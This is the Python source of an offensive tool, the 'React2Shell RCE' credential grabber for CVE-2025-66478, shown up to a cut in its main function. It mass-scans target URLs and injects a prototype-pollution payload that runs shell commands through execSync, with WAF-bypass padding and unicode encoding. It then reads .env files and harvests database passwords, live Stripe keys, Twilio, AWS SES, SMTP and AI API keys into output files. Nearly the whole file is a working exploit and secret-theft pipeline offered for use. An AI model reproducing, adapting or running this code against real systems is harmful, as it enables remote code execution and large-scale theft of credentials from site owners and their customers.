import sys
import os
import json
import asyncio
import aiohttp
import random
import string
import urllib.parse
import base64
import re
import signal
from datetime import datetime
from configparser import ConfigParser

# Configuration
TIMEOUT = 15
MAX_CONCURRENT = 50
PID_RESTORE = '.nero_swallowtail'

class Colors:
    GREEN = '\033[32m'
    BRIGHT_GREEN = '\033[1;92m'
    AMBER = '\033[33m'
    DARK_GREEN = '\033[2;32m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    WHITE = '\033[97m'
    BLUE = '\033[94m'

# Global state for checkpoint
checkpoint_state = {
    'target_file': '',
    'output_dir': '',
    'last_processed': '',
    'waf_bypass': False,
    'waf_bypass_size_kb': 128,
    'unicode_encode': False,
    'processed_urls': set()
}

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Colors.BRIGHT_GREEN}{Colors.BOLD}
██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║     
██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                 
                        React2Shell RCE - CVE-2025-66478
{Colors.AMBER}{Colors.BOLD}
               Automated ENV Grabber with Multi-Output
{Colors.DARK_GREEN}
          Author: Bob Marley (https://github.com/khadafigans)
{Colors.RESET}
    """
    print(banner)
    print(f"{Colors.DARK_GREEN}System online, Welcome Administrator!. Ready to own everything.{Colors.RESET}\n")

def save_checkpoint():
    """Save current progress to checkpoint file"""
    try:
        config = ConfigParser()
        config['SESSION'] = {
            'TARGET_FILE': checkpoint_state['target_file'],
            'OUTPUT_DIR': checkpoint_state['output_dir'],
            'LAST_PROCESSED': checkpoint_state['last_processed'],
            'WAF_BYPASS': str(checkpoint_state['waf_bypass']),
            'WAF_BYPASS_SIZE_KB': str(checkpoint_state['waf_bypass_size_kb']),
            'UNICODE_ENCODE': str(checkpoint_state['unicode_encode']),
            'PROCESSED_COUNT': str(len(checkpoint_state['processed_urls']))
        }
        # Save processed URLs
        config['PROCESSED'] = {
            'URLS': '\n'.join(checkpoint_state['processed_urls'])
        }
        with open(PID_RESTORE, 'w') as f:
            config.write(f)
        print(f"\n{Colors.YELLOW}[!] CTRL+C detected — session saved to {PID_RESTORE}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Processed {len(checkpoint_state['processed_urls'])} URLs{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Output directory: {checkpoint_state['output_dir']}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to save checkpoint: {e}{Colors.RESET}")

def load_checkpoint():
    """Load checkpoint from file if exists"""
    if not os.path.exists(PID_RESTORE):
        return None
    
    try:
        config = ConfigParser()
        config.read(PID_RESTORE)
        
        checkpoint = {
            'target_file': config.get('SESSION', 'TARGET_FILE'),
            'output_dir': config.get('SESSION', 'OUTPUT_DIR'),
            'last_processed': config.get('SESSION', 'LAST_PROCESSED'),
            'waf_bypass': config.get('SESSION', 'WAF_BYPASS') == 'True',
            'waf_bypass_size_kb': int(config.get('SESSION', 'WAF_BYPASS_SIZE_KB')),
            'unicode_encode': config.get('SESSION', 'UNICODE_ENCODE') == 'True',
            'processed_urls': set(config.get('PROCESSED', 'URLS').split('\n')) if config.get('PROCESSED', 'URLS') else set()
        }
        return checkpoint
    except Exception as e:
        print(f"{Colors.RED}[!] Failed to load checkpoint: {e}{Colors.RESET}")
        return None

def normalize_url(url: str) -> str:
    """Normalize URL - handles domain.com, http://, https://"""
    url = url.strip()
    if not url:
        return None
    if not url.startswith(("http://", "https://")):
        url = 'https://' + url
    return url.rstrip("/")

def generate_junk_data(size_kb: int = 128):
    """Generate random junk data for WAF bypass."""
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))
    return param_name, junk

def encode_unicode(data: str) -> str:
    """Encode string characters as Unicode escapes for WAF bypass."""
    result = []
    in_string = False
    i = 0
    while i < len(data):
        c = data[i]
        if c == '"':
            in_string = not in_string
            result.append(c)
        elif not in_string:
            result.append(c)
        elif c == '\\' and i + 1 < len(data):
            result.append(c)
            result.append(data[i + 1])
            i += 1
        else:
            result.append(f"\\u{ord(c):04x}")
        i += 1
    return ''.join(result)

def get_headers(content_type: str = None) -> dict:
    """Build request headers"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": f"scan-{random.randint(1000, 9999)}",
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }
    if content_type:
        headers["Content-Type"] = content_type
    return headers

def build_safe_payload():
    """Safe payload for detection"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def build_rce_payload(cmd: str, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, unicode_encode: bool = False):
    """RCE payload with WAF bypass support"""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    escaped_cmd = cmd.replace("'", "\\'")
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{escaped_cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{encodeURIComponent(res)}};307;`}});"
    )

    part0 = json.dumps({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_payload,
            "_chunks": "$Q2",
            "_formData": {"get": "$1:constructor:constructor"}
        }
    })

    if unicode_encode:
        part0 = encode_unicode(part0)

    parts = []

    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.extend([
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n',
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ])

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

async def send_payload(session, url, body, content_type):
    """Send payload"""
    try:
        headers = get_headers(content_type)
        post_url = f"{url}/"
        
        async with session.post(
            post_url,
            data=body.encode('utf-8'),
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            allow_redirects=False,
            ssl=False
        ) as resp:
            text = await resp.text()
            redirect = resp.headers.get("X-Action-Redirect", "")
            return resp.status, redirect, text
    except Exception as e:
        return None, '', str(e)

async def detect_safe(session, url):
    """Detect vulnerability"""
    body, content_type = build_safe_payload()
    status, redirect, text = await send_payload(session, url, body, content_type)
    
    if status == 500 and 'E{"digest"' in text:
        return True
    return False

async def exploit_rce(session, url, cmd, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, unicode_encode: bool = False):
    """Execute command and get output"""
    body, content_type = build_rce_payload(cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode)
    status, redirect, text = await send_payload(session, url, body, content_type)
    
    if redirect:
        match = re.search(r'[?&]a=([^&;]+)', redirect)
        if match:
            output = urllib.parse.unquote(match.group(1))
            return True, output
    
    return False, "No output"

# ==================== DB URL PARSER ====================

def parse_database_url(db_url: str) -> dict:
    """
    Parse database URL and extract components.
    Supports formats like:
    - postgresql://user:pass@host:port/dbname
    - mysql://user:pass@host:port/dbname
    - postgres://user:pass@host:port/dbname
    - mongodb://user:pass@host:port/dbname
    - sqlserver://user:pass@host:port/dbname
    """
    result = {}
    
    if not db_url:
        return result
    
    try:
        # Determine connection type from URL scheme
        if db_url.startswith('postgresql://') or db_url.startswith('postgres://'):
            result['connection'] = 'postgresql'
        elif db_url.startswith('mysql://'):
            result['connection'] = 'mysql'
        elif db_url.startswith('mongodb://') or db_url.startswith('mongodb+srv://'):
            result['connection'] = 'mongodb'
        elif db_url.startswith('sqlserver://') or db_url.startswith('mssql://'):
            result['connection'] = 'sqlsrv'
        elif db_url.startswith('sqlite://'):
            result['connection'] = 'sqlite'
        else:
            # Try to extract from URL
            match = re.match(r'^([a-zA-Z0-9+]+)://', db_url)
            if match:
                result['connection'] = match.group(1)
        
        # Parse the URL
        # Handle special case for postgres with pooler URLs
        parsed = urllib.parse.urlparse(db_url)
        
        # Extract user and password
        if parsed.username:
            result['user'] = urllib.parse.unquote(parsed.username)
        if parsed.password:
            result['password'] = urllib.parse.unquote(parsed.password)
        
        # Extract host
        if parsed.hostname:
            result['host'] = parsed.hostname
        
        # Extract port
        if parsed.port:
            result['port'] = str(parsed.port)
        
        # Extract database name from path
        if parsed.path and parsed.path != '/':
            db_name = parsed.path.lstrip('/')
            # Handle query parameters in path
            if '?' in db_name:
                db_name = db_name.split('?')[0]
            result['name'] = db_name
        
    except Exception as e:
        pass
    
    return result

# ==================== CREDENTIAL EXTRACTION ====================

def parse_env_content(content: str) -> dict:
    """Parse .env file content into key-value pairs"""
    env_vars = {}
    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if '=' in line:
            key, _, value = line.partition('=')
            key = key.strip()
            value = value.strip().strip('"').strip("'")
            env_vars[key] = value
    return env_vars

def extract_db_credentials(env_vars: dict, url: str) -> dict:
    """Extract database credentials with DB_URL parsing"""
    db_info = {'url': url}
    
    # First check for DATABASE_URL and parse it
    db_url_keys = ['DATABASE_URL', 'DB_URL', 'MYSQL_URL', 'POSTGRES_URL', 'PG_URL', 'MONGODB_URI', 'MONGO_URL']
    db_url_value = None
    for key in db_url_keys:
        if key in env_vars:
            db_url_value = env_vars[key]
            db_info['db_url'] = db_url_value
            break
    
    # Parse DB_URL if found
    if db_url_value:
        parsed = parse_database_url(db_url_value)
        # Fill in parsed values (these can be overridden by explicit env vars below)
        if 'connection' in parsed:
            db_info['connection'] = parsed['connection']
        if 'host' in parsed:
            db_info['host'] = parsed['host']
        if 'port' in parsed:
            db_info['port'] = parsed['port']
        if 'user' in parsed:
            db_info['user'] = parsed['user']
        if 'password' in parsed:
            db_info['password'] = parsed['password']
        if 'name' in parsed:
            db_info['name'] = parsed['name']
    
    # Override with explicit env vars if present
    db_connection_keys = ['DB_CONNECTION', 'DATABASE_CONNECTION', 'DB_DRIVER', 'DATABASE_DRIVER']
    for key in db_connection_keys:
        if key in env_vars:
            db_info['connection'] = env_vars[key]
            break
    
    db_host_keys = ['DB_HOST', 'DATABASE_HOST', 'MYSQL_HOST', 'POSTGRES_HOST', 'PG_HOST']
    for key in db_host_keys:
        if key in env_vars:
            db_info['host'] = env_vars[key]
            break
    
    db_port_keys = ['DB_PORT', 'DATABASE_PORT', 'MYSQL_PORT', 'POSTGRES_PORT', 'PG_PORT']
    for key in db_port_keys:
        if key in env_vars:
            db_info['port'] = env_vars[key]
            break
    
    db_user_keys = ['DB_USER', 'DB_USERNAME', 'DATABASE_USER', 'DATABASE_USERNAME', 'MYSQL_USER', 'POSTGRES_USER', 'PG_USER']
    for key in db_user_keys:
        if key in env_vars:
            db_info['user'] = env_vars[key]
            break
    
    db_pass_keys = ['DB_PASS', 'DB_PASSWORD', 'DATABASE_PASS', 'DATABASE_PASSWORD', 'MYSQL_PASSWORD', 'POSTGRES_PASSWORD', 'PG_PASSWORD']
    for key in db_pass_keys:
        if key in env_vars:
            db_info['password'] = env_vars[key]
            break
    
    db_name_keys = ['DB_NAME', 'DB_DATABASE', 'DATABASE_NAME', 'DATABASE', 'MYSQL_DATABASE', 'POSTGRES_DB', 'PG_DATABASE']
    for key in db_name_keys:
        if key in env_vars:
            db_info['name'] = env_vars[key]
            break
    
    return db_info if len(db_info) > 1 else None

def extract_stripe_keys(env_vars: dict, url: str) -> dict:
    """Extract Stripe keys - sk_live_ only"""
    stripe_info = {'url': url}
    
    stripe_keys = ['STRIPE_SECRET', 'STRIPE_SECRET_KEY', 'STRIPE_SK', 'STRIPE_API_KEY', 'STRIPE_LIVE_SECRET_KEY']
    for key in stripe_keys:
        if key in env_vars:
            value = env_vars[key]
            if value.startswith('sk_live_'):
                stripe_info['secret'] = value
                return stripe_info
    
    # Also check for any key containing stripe and sk_live_
    for key, value in env_vars.items():
        if 'stripe' in key.lower() and value.startswith('sk_live_'):
            stripe_info['secret'] = value
            return stripe_info
    
    return None

def extract_twilio_credentials(env_vars: dict, url: str) -> dict:
    """Extract Twilio credentials"""
    twilio_info = {'url': url}
    
    # Account SID
    sid_keys = ['TWILIO_ACCOUNT_SID', 'TWILIO_SID', 'TWILIO_ACCOUNT_ID']
    for key in sid_keys:
        if key in env_vars:
            twilio_info['account_sid'] = env_vars[key]
            break
    
    # API Key / Auth Token
    api_keys = ['TWILIO_API_KEY', 'TWILIO_AUTH_TOKEN', 'TWILIO_TOKEN', 'TWILIO_API_SECRET']
    for key in api_keys:
        if key in env_vars:
            twilio_info['api_key'] = env_vars[key]
            break
    
    # Phone Number
    number_keys = ['TWILIO_NUMBER', 'TWILIO_PHONE_NUMBER', 'TWILIO_FROM_NUMBER', 'TWILIO_PHONE']
    for key in number_keys:
        if key in env_vars:
            twilio_info['number'] = env_vars[key]
            break
    
    return twilio_info if 'account_sid' in twilio_info or 'api_key' in twilio_info else None

def extract_ai_keys(env_vars: dict, url: str) -> list:
    """Extract AI API keys (OpenAI, Gemini, Anthropic, Grok, DeepSeek)"""
    ai_keys = []
    
    # OpenAI
    openai_keys = ['OPENAI_API_KEY', 'OPENAI_KEY', 'OPENAI_SECRET_KEY']
    for key in openai_keys:
        if key in env_vars:
            value = env_vars[key]
            if value.startswith('sk-'):
                ai_keys.append({'url': url, 'type': 'OPEN-AI', 'key': value})
            break
    
    # Gemini / Google AI
    gemini_keys = ['GEMINI_API_KEY', 'GOOGLE_AI_KEY', 'GOOGLE_API_KEY', 'GEMINI_KEY']
    for key in gemini_keys:
        if key in env_vars:
            ai_keys.append({'url': url, 'type': 'GEMINI', 'key': env_vars[key]})
            break
    
    # Anthropic / Claude
    anthropic_keys = ['ANTHROPIC_API_KEY', 'CLAUDE_API_KEY', 'ANTHROPIC_KEY']
    for key in anthropic_keys:
        if key in env_vars:
            ai_keys.append({'url': url, 'type': 'ANTHROPIC', 'key': env_vars[key]})
            break
    
    # Grok / xAI
    grok_keys = ['GROK_API_KEY', 'XAI_API_KEY', 'GROK_KEY']
    for key in grok_keys:
        if key in env_vars:
            ai_keys.append({'url': url, 'type': 'GROK', 'key': env_vars[key]})
            break
    
    # DeepSeek
    deepseek_keys = ['DEEPSEEK_API_KEY', 'DEEPSEEK_KEY']
    for key in deepseek_keys:
        if key in env_vars:
            ai_keys.append({'url': url, 'type': 'DEEPSEEK', 'key': env_vars[key]})
            break
    
    return ai_keys if ai_keys else None

def extract_aws_ses(env_vars: dict, url: str) -> dict:
    """Extract AWS SES credentials"""
    ses_info = {'url': url}
    
    # SES Host
    host_keys = ['SES_HOST', 'AWS_SES_HOST', 'MAIL_HOST', 'SMTP_HOST']
    for key in host_keys:
        if key in env_vars:
            value = env_vars[key]
            if 'amazonaws.com' in value or 'email-smtp' in value:
                ses_info['host'] = value
                break
    
    # SES Region
    region_keys = ['SES_REGION', 'AWS_SES_REGION', 'AWS_REGION', 'AWS_DEFAULT_REGION']
    for key in region_keys:
        if key in env_vars:
            ses_info['region'] = env_vars[key]
            break
    
    # Access Key ID
    access_keys = ['SES_ACCESS_KEY_ID', 'AWS_ACCESS_KEY_ID', 'AWS_ACCESS_KEY', 'SES_KEY', 'MAIL_USERNAME']
    for key in access_keys:
        if key in env_vars:
            value = env_vars[key]
            if value.startswith('AKIA') or 'SES' in key.upper():
                ses_info['access_key_id'] = value
                break
    
    # Secret Access Key
    secret_keys = ['SES_SECRET_ACCESS_KEY', 'AWS_SECRET_ACCESS_KEY', 'AWS_SECRET_KEY', 'SES_SECRET', 'MAIL_PASSWORD']
    for key in secret_keys:
        if key in env_vars:
            ses_info['secret_access_key'] = env_vars[key]
            break
    
    # From Email
    from_email_keys = ['SES_FROM_EMAIL', 'AWS_SES_FROM_EMAIL', 'MAIL_FROM_ADDRESS', 'MAIL_FROM']
    for key in from_email_keys:
        if key in env_vars:
            ses_info['from_email'] = env_vars[key]
            break
    
    # From Name
    from_name_keys = ['SES_FROM_NAME', 'AWS_SES_FROM_NAME', 'MAIL_FROM_NAME']
    for key in from_name_keys:
        if key in env_vars:
            ses_info['from_name'] = env_vars[key]
            break
    
    # Only return if we have SES-specific keys (not just generic SMTP)
    if 'access_key_id' in ses_info or ('host' in ses_info and 'amazonaws' in ses_info.get('host', '')):
        return ses_info
    return None

def extract_smtp(env_vars: dict, url: str) -> dict:
    """Extract SMTP credentials"""
    smtp_info = {'url': url}
    
    # SMTP Host
    host_keys = ['SMTP_HOST', 'MAIL_HOST', 'EMAIL_HOST', 'SMTP_SERVER', 'MAIL_SERVER']
    for key in host_keys:
        if key in env_vars:
            smtp_info['host'] = env_vars[key]
            break
    
    # SMTP Port
    port_keys = ['SMTP_PORT', 'MAIL_PORT', 'EMAIL_PORT']
    for key in port_keys:
        if key in env_vars:
            smtp_info['port'] = env_vars[key]
            break
    
    # SMTP Username
    user_keys = ['SMTP_USERNAME', 'SMTP_USER', 'MAIL_USERNAME', 'MAIL_USER', 'EMAIL_USER', 'EMAIL_USERNAME']
    for key in user_keys:
        if key in env_vars:
            smtp_info['username'] = env_vars[key]
            break
    
    # SMTP Password
    pass_keys = ['SMTP_PASSWORD', 'SMTP_PASS', 'MAIL_PASSWORD', 'MAIL_PASS', 'EMAIL_PASSWORD', 'EMAIL_PASS']
    for key in pass_keys:
        if key in env_vars:
            smtp_info['password'] = env_vars[key]
            break
    
    # From Email
    from_keys = ['SMTP_FROM_MAIL', 'SMTP_FROM', 'MAIL_FROM', 'MAIL_FROM_ADDRESS', 'EMAIL_FROM']
    for key in from_keys:
        if key in env_vars:
            smtp_info['from_mail'] = env_vars[key]
            break
    
    return smtp_info if 'host' in smtp_info or 'username' in smtp_info else None

# ==================== OUTPUT FORMATTERS ====================

def format_db_output(db_info: dict) -> str:
    """Format database credentials output"""
    lines = [f"URL: {db_info.get('url', '')}"]
    lines.append(f"DB_CONNECTION: {db_info.get('connection', '')}")
    lines.append(f"DB_HOST: {db_info.get('host', '')}")
    lines.append(f"DB_PORT: {db_info.get('port', '')}")
    lines.append(f"DB_USER: {db_info.get('user', '')}")
    lines.append(f"DB_PASS: {db_info.get('password', '')}")
    lines.append(f"DB_NAME: {db_info.get('name', '')}")
    lines.append(f"DB_URL: {db_info.get('db_url', '')}")
    return '\n'.join(lines) + '\n\n'

def format_stripe_output(stripe_info: dict) -> str:
    """Format Stripe key output"""
    lines = [f"URL: {stripe_info.get('url', '')}"]
    lines.append(f"STRIPE_SECRET: {stripe_info.get('secret', '')}")
    return '\n'.join(lines) + '\n\n'

def format_twilio_output(twilio_info: dict) -> str:
    """Format Twilio credentials output"""
    lines = [f"URL: {twilio_info.get('url', '')}"]
    lines.append(f"TWILIO_ACCOUNT_SID: {twilio_info.get('account_sid', '')}")
    lines.append(f"TWILIO_API_KEY: {twilio_info.get('api_key', '')}")
    lines.append(f"TWILIO_NUMBER: {twilio_info.get('number', '')}")
    return '\n'.join(lines) + '\n\n'

def format_ai_key_output(ai_info: dict) -> str:
    """Format AI key output"""
    lines = [f"URL: {ai_info.get('url', '')}"]
    lines.append(f"TYPE: {ai_info.get('type', '')}")
    lines.append(f"KEY: {ai_info.get('key', '')}")
    return '\n'.join(lines) + '\n\n'

def format_ses_output(ses_info: dict) -> str:
    """Format AWS SES output"""
    lines = [f"URL: {ses_info.get('url', '')}"]
    lines.append(f"SES_HOST: {ses_info.get('host', '')}")
    lines.append(f"SES_REGION: {ses_info.get('region', '')}")
    lines.append(f"SES_ACCESS_KEY_ID: {ses_info.get('access_key_id', '')}")
    lines.append(f"SES_SECRET_ACCESS_KEY: {ses_info.get('secret_access_key', '')}")
    lines.append(f"SES_FROM_EMAIL: {ses_info.get('from_email', '')}")
    lines.append(f"SES_FROM_NAME: {ses_info.get('from_name', '')}")
    return '\n'.join(lines) + '\n\n'

def format_smtp_output(smtp_info: dict) -> str:
    """Format SMTP output"""
    lines = [f"URL: {smtp_info.get('url', '')}"]
    lines.append(f"SMTP_HOST: {smtp_info.get('host', '')}")
    lines.append(f"SMTP_PORT: {smtp_info.get('port', '')}")
    lines.append(f"SMTP_USERNAME: {smtp_info.get('username', '')}")
    lines.append(f"SMTP_PASSWORD: {smtp_info.get('password', '')}")
    lines.append(f"SMTP_FROM_MAIL: {smtp_info.get('from_mail', '')}")
    return '\n'.join(lines) + '\n\n'

# ==================== MAIN EXTRACTION LOGIC ====================

async def grab_env_files(session, url, waf_bypass=False, waf_bypass_size_kb=128, unicode_encode=False):
    """Grab .env, .env.local, .env.production files"""
    env_files = ['.env', '.env.local', '.env.production', '.env.development']
    all_env_content = ""
    
    for env_file in env_files:
        cmd = f"cat {env_file} 2>/dev/null || cat ../{env_file} 2>/dev/null || cat ../../{env_file} 2>/dev/null"
        success, output = await exploit_rce(session, url, cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode)
        if success and output and output != "No output" and "No such file" not in output:
            all_env_content += output + "\n"
    
    return all_env_content

async def process_target(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, stats, lock):
    """Process a single target and extract credentials"""
    global checkpoint_state
    
    result = {
        'url': url,
        'vulnerable': False,
        'db': None,
        'stripe': None,
        'twilio': None,
        'ai_keys': None,
        'ses': None,
        'smtp': None
    }
    
    try:
        # Update checkpoint state
        checkpoint_state['last_processed'] = url
        checkpoint_state['processed_urls'].add(url)
        
        # First detect if vulnerable
        if not await detect_safe(session, url):
            print(f"{Colors.DIM}[-] {url} - Not vulnerable{Colors.RESET}")
            return result
        
        result['vulnerable'] = True
        async with lock:
            stats['vuln'] += 1
        
        print(f"{Colors.BRIGHT_GREEN}[VULN] {url} - Vulnerable! Extracting credentials...{Colors.RESET}")
        
        # Grab env files
        env_content = await grab_env_files(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode)
        
        if not env_content or env_content.strip() == "":
            print(f"{Colors.YELLOW}  └── No .env files found{Colors.RESET}")
            return result
        
        # Parse env content
        env_vars = parse_env_content(env_content)
        
        if not env_vars:
            print(f"{Colors.YELLOW}  └── Empty .env content{Colors.RESET}")
            return result
        
        # Extract all credential types
        result['db'] = extract_db_credentials(env_vars, url)
        result['stripe'] = extract_stripe_keys(env_vars, url)
        result['twilio'] = extract_twilio_credentials(env_vars, url)
        result['ai_keys'] = extract_ai_keys(env_vars, url)
        result['ses'] = extract_aws_ses(env_vars, url)
        result['smtp'] = extract_smtp(env_vars, url)
        
        # Build found items list for CLI output
        found_items = []
        
        # Write to output files and track what was found
        if result['db']:
            with open(output_files['db'], 'a') as f:
                f.write(format_db_output(result['db']))
            found_items.append(f"{Colors.CYAN}DB{Colors.RESET}")
            async with lock:
                stats['db'] += 1
        
        if result['stripe']:
            with open(output_files['stripe'], 'a') as f:
                f.write(format_stripe_output(result['stripe']))
            found_items.append(f"{Colors.MAGENTA}STRIPE{Colors.RESET}")
            async with lock:
                stats['stripe'] += 1
        
        if result['twilio']:
            with open(output_files['twilio'], 'a') as f:
                f.write(format_twilio_output(result['twilio']))
            found_items.append(f"{Colors.BLUE}TWILIO{Colors.RESET}")
            async with lock:
                stats['twilio'] += 1
        
        if result['ai_keys']:
            for ai_key in result['ai_keys']:
                with open(output_files['ai'], 'a') as f:
                    f.write(format_ai_key_output(ai_key))
                found_items.append(f"{Colors.GREEN}{ai_key['type']}{Colors.RESET}")
            async with lock:
                stats['ai'] += len(result['ai_keys'])
        
        if result['ses']:
            with open(output_files['ses'], 'a') as f:
                f.write(format_ses_output(result['ses']))
            found_items.append(f"{Colors.AMBER}AWS-SES{Colors.RESET}")
            async with lock:
                stats['ses'] += 1
        
        if result['smtp']:
            with open(output_files['smtp'], 'a') as f:
                f.write(format_smtp_output(result['smtp']))
            found_items.append(f"{Colors.DARK_GREEN}SMTP{Colors.RESET}")
            async with lock:
                stats['smtp'] += 1
        
        # Print what was found
        if found_items:
            print(f"{Colors.WHITE}  └── Found: {', '.join(found_items)}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}  └── .env found but no target credentials{Colors.RESET}")
        
    except Exception as e:
        print(f"{Colors.RED}[ERR] {url} - {str(e)[:50]}{Colors.RESET}")
    
    return result

async def scan_targets(targets, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, skip_urls=None):
    """Scan all targets concurrently with real-time output"""
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, ssl=False)
    
    # Stats tracking
    stats = {
        'vuln': 0,
        'db': 0,
        'stripe': 0,
        'twilio': 0,
        'ai': 0,
        'ses': 0,
        'smtp': 0
    }
    lock = asyncio.Lock()
    
    # Filter out already processed URLs
    if skip_urls:
        targets = [t for t in targets if normalize_url(t) not in skip_urls]
        print(f"{Colors.CYAN}[*] Skipping {len(skip_urls)} already processed URLs{Colors.RESET}")
    
    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
        semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        
        async def process_with_semaphore(url):
            async with semaphore:
                return await process_target(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, stats, lock)
        
        tasks = [process_with_semaphore(normalize_url(t)) for t in targets if normalize_url(t)]
        
        results = []
        for coro in asyncio.as_completed(tasks):
            result = await coro
            results.append(result)
        
        return results, stats

def signal_handler(signum, frame):
    """Handle CTRL+C signal"""
    save_checkpoint()
    sys.exit(0)

async def main():
    global checkpoint_state
    
    # Register signal handler for CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    
    print_banner()
    
    # Check for existing checkpoint
    checkpoint = load_checkpoint()
    skip_urls = None
    
    if checkpoint:
        print(f"{Colors.YELLOW}[!] Session checkpoint found!{Colors.RESET}")
        print(f"{Colors.CYAN}    Target file: {checkpoint['target_file']}{Colors.RESET}")
        print(f"{Colors.CYAN}    Output dir: {checkpoint['output_dir']}{Colors.RESET}")
        print(f"{Colors.CYAN}    Processed: {len(checkpoint['processed_urls'])} URLs{Colors.RESET}")
        
        resume = input(f"{Colors.AMBER}[+] Continue from checkpoint? (Y/n): {Colors.RESET}").strip().lower()
        
        if resume != 'n':
            # Restore checkpoint state
            checkpoint_state = checkpoint.copy()
            target_input = checkpoint['target_file']
            output_dir = checkpoint['output_dir']
            waf_bypass = checkpoint['waf_bypass']
            waf_bypass_size_kb = checkpoint['waf_bypass_size_kb']
            unicode_encode = checkpoint['unicode_encode']
            skip_urls = checkpoint['processed_urls']
            
            print(f"{Colors.GREEN}[*] Resuming from checkpoint...{Colors.RESET}")
        else:
            # Start fresh
            checkpoint = None
            try:
                os.remove(PID_RESTORE)
            except:
                pass
    
    if not checkpoint or resume == 'n':
        # Get target file
        target_input = input(f"{Colors.AMBER}[+] Targets file path: {Colors.RESET}").strip()
        
        if not os.path.isfile(target_input):
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.RESET}")
            return
        
        # WAF Bypass Options
        waf_bypass = input(f"{Colors.AMBER}[+] Enable WAF bypass? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
        waf_bypass_size_kb = 128
        if waf_bypass:
            size_input = input(f"{Colors.AMBER}[+] Junk data size in KB (default 128): {Colors.RESET}").strip()
            if size_input.isdigit():
                waf_bypass_size_kb = int(size_input)
        
        unicode_encode = input(f"{Colors.AMBER}[+] Enable Unicode encoding? (y/n) [n]: {Colors.RESET}").strip().lower() == 'y'
        
        # Create output directory with timestamp
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = f"Result_{ts}"
        os.makedirs(output_dir, exist_ok=True)
    
    # Load targets
    with open(target_input) as f:
        targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    
    print(f"{Colors.CYAN}[*] Loaded {len(targets)} targets{Colors.RESET}")
    
    # Update checkpoint state
    checkpoint_state['target_file'] = target_input
    checkpoint_state['output_dir'] = output_dir
    checkpoint_state['waf_bypass'] = waf_bypass
